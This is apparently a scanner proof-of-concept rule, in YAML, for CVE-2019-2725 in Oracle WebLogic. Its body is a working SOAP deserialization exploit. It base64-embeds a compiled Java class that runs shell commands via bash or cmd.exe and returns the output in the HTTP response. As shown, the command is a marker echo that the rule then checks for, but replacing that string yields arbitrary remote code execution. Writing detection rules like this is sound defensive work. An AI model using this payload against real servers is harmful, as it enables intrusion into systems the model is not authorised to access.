name: poc-yaml-weblogic12-cve-2019-2725
rules:
  - method: POST
    path: /wls-wsat/CoordinatorPortType
    headers:
      Content-Type: text/xml
    body: |-
      <?xml version="1.0" encoding="utf-8"?>
      <soapenv:Envelope
          xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
          xmlns:wsa="http://www.w3.org/2005/08/addressing"
          xmlns:asy="http://www.bea.com/async/AsyncResponseService">
          <soapenv:Header>
              <wsa:Action>xx</wsa:Action>
              <wsa:RelatesTo>xx</wsa:RelatesTo>
              <work:WorkContext
                  xmlns:work="http://bea.com/2004/06/soap/workarea/">
                  <java>
                      <class>
                          <string>org.slf4j.ext.EventData</string>
                          <void>
                              <string>
                                  <java>
                                      <void class="sun.misc.BASE64Decoder">
                                          <void method="decodeBuffer" id="byte_arr">
                                              <string>yv66vgAAADIAqgoAJwBcCgBdAF4KAF0AXwoAYABhBwBiCgAFAGMHAGQKAAcAZQgAZgoABwBnBwBoCgALAFwKAAsAaQoACwBqCABrCgBsAG0KAG4AbwgAcAoAbgBxBwByCgAUAFwIAHMKABQAdAgAdQgAdggAdwcAeAoAGwB5CgAbAHoKABsAewcAfAoAHwB9CgAmAH4IAH8KACYAgAkAbACBCgCCAIMHAIQHAIUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAlleGVjX2NtZDIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQADZmlzAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQAGcmVzdWx0AQANU3RhY2tNYXBUYWJsZQcAhgcAhwcAiAcAYgcAZAEACkV4Y2VwdGlvbnMBAAhleGVjX2NtZAEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAZpc193aW4BAAFaAQAEb3NfdAEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAdwcm9jZXNzBwByBwB4BwB8AQAHZG9fZXhlYwEABHZhcjMHAIkBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABcwEAClNvdXJjZUZpbGUBABNSZXN1bHRCYXNlRXhlYy5qYXZhDAAoACkHAIoMAIsAjAwAjQCOBwCHDACPAJABABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAoAJEBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAoAJIBAAAMAJMAlAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDACVAJYMAJcAlAEAB29zLm5hbWUHAJgMAJkAMAcAhgwAmgCUAQADd2luDACbAJwBABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAJL2Jpbi9iYXNoDACdAJ4BAAItYwEAB2NtZC5leGUBAAIvYwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAKACfDACgAKEMAKIAowEAE2phdmEvaW8vSU9FeGNlcHRpb24MAKQAKQwARAAwAQAKZWNobyBkZGRkZAwAUgAwDAClAKYHAKcMAKgAqQEADlJlc3VsdEJhc2VFeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEyhMamF2YS91dGlsL0xpc3Q7KVYBABNyZWRpcmVjdEVycm9yU3RyZWFtAQAdKFopTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEAJgAnAAAAAAAFAAEAKAApAAEAKgAAADMAAQABAAAABSq3AAGxAAAAAgArAAAACgACAAAADAAEAA0ALAAAAAwAAQAAAAUALQAuAAAACQAvADAAAgAqAAAA8QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwArAAAAHgAHAAAAEAAIABEADQASABYAEwAgABQAIwAXAEsAGwAsAAAASAAHAAAATgAxADIAAAAIAEYAMwA0AAEADQBBADUANgACABYAOAA3ADgAAwAgAC4AOQA6AAQAIwArADsAMgAFACcAJwA8ADIABgA9AAAAHwAC/wAnAAcHAD4HAD8HAEAHAEEHAEIHAD4HAD4AACMAQwAAAAQAAQAfAAkARAAwAAIAKgAAAhkAAwALAAAAwQM8Eg+4ABBNLMYAESy2ABESErYAE5kABQQ8uwAUWbcAFU4bmgAaLRIWtgAXVy0SGLYAF1ctKrYAF1enABctEhm2ABdXLRIatgAXVy0qtgAXV7sAG1kttwAcOgQZBAS2AB1XAToFGQS2AB46BacACjoGGQa2ACAZBbYABDoGuwAFWRkGtwAGOge7AAdZGQe3AAg6CAE6CRIJOgoZCLYAClk6CcYAHLsAC1m3AAwZCrYADRkJtgANtgAOOgqn/98ZCrAAAQBlAGwAbwAfAAMAKwAAAGYAGQAAAB8AAgAgAAgAIgAYACMAGgAnACIAKQAmACoALQArADQALAA9AC4ARAAvAEsAMABRADIAWwAzAGIANABlADYAbAA5AG8ANwBxADgAdgA7AH0APACIAD0AkwA+AJYAQQC+AEUALAAAAHoADABxAAUARQBGAAYAAADBADEAMgAAAAIAvwBHAEgAAQAIALkASQAyAAIAIgCfAEoASwADAFsAZgBMAE0ABABlAFwATgA0AAUAfQBEADUANgAGAIgAOQA3ADgABwCTAC4AOQA6AAgAlgArADsAMgAJAJoAJwA8ADIACgA9AAAAUgAH/QAaAQcAPvwAIgcATxP/AB0ABgcAPgEHAD4HAE8HAFAHAD8AAQcAUQb/ACMACwcAPgEHAD4HAE8HAFAHAD8HAEAHAEEHAEIHAD4HAD4AACMAQwAAAAQAAQAfAAkAUgAwAAIAKgAAAH0AAQADAAAADhIJTCq4ACFMpwAETSuwAAEAAwAIAAsAHwADACsAAAAWAAUAAABIAAMASwAIAE4ACwBMAAwAUAAsAAAAIAADAAwAAABTAEYAAgAAAA4AMQAyAAAAAwALADwAMgABAD0AAAATAAL/AAsAAgcAPgcAPgABBwBRAABDAAAABAABAFQACQBVAFYAAgAqAAAASgACAAIAAAAOEiK4ACNMsgAkK7YAJbEAAAACACsAAAAOAAMAAABWAAYAVwANAFgALAAAABYAAgAAAA4AVwBYAAAABgAIAFkAMgABAEMAAAAEAAEAVAABAFoAAAACAFs=</string>
                                          </void>
                                      </void>
                                      <void class="org.mozilla.classfile.DefiningClassLoader">
                                          <void method="defineClass">
                                              <string>ResultBaseExec</string>
                                              <object idref="byte_arr"/>
                                              <void method="newInstance">
                                                  <void method="do_exec" id="result">
                                                      <string>echo 81dc9bdb52d04dc2003E6dbd8313ed055</string>
                                                  </void>
                                              </void>
                                          </void>
                                      </void>
                                      <void class="java.lang.Thread" method="currentThread">
                                          <void method="getCurrentWork" id="current_work">
                                              <void method="getClass">
                                                  <void method="getDeclaredField">
                                                      <string>connectionHandler</string>
                                                      <void method="setAccessible">
                                                          <boolean>true</boolean>
                                                      </void>
                                                      <void method="get">
                                                          <object idref="current_work"/>
                                                          <void method="getServletRequest">
                                                              <void method="getResponse">
                                                                  <void method="getServletOutputStream">
                                                                      <void method="writeStream">
                                                                          <object class="weblogic.xml.util.StringInputStream">
                                                                              <object idref="result"/></object>
                                                                      </void>
                                                                      <void method="flush"/></void>
                                                                  <void method="getWriter">
                                                                      <void method="write">
                                                                          <string/>
                                                                      </void>
                                                                  </void>
                                                              </void>
                                                          </void>
                                                      </void>
                                                  </void>
                                              </void>
                                          </void>
                                      </void>
                                  </java>
                              </string>
                          </void>
                      </class>
                  </java>
              </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body>
              <asy:onAsyncDelivery/>
          </soapenv:Body>
      </soapenv:Envelope>
    follow_redirects: false
    expression: 'status == 200 && body.bcontains(b"81dc9bdb52d04dc2003E6dbd8313ed055")'
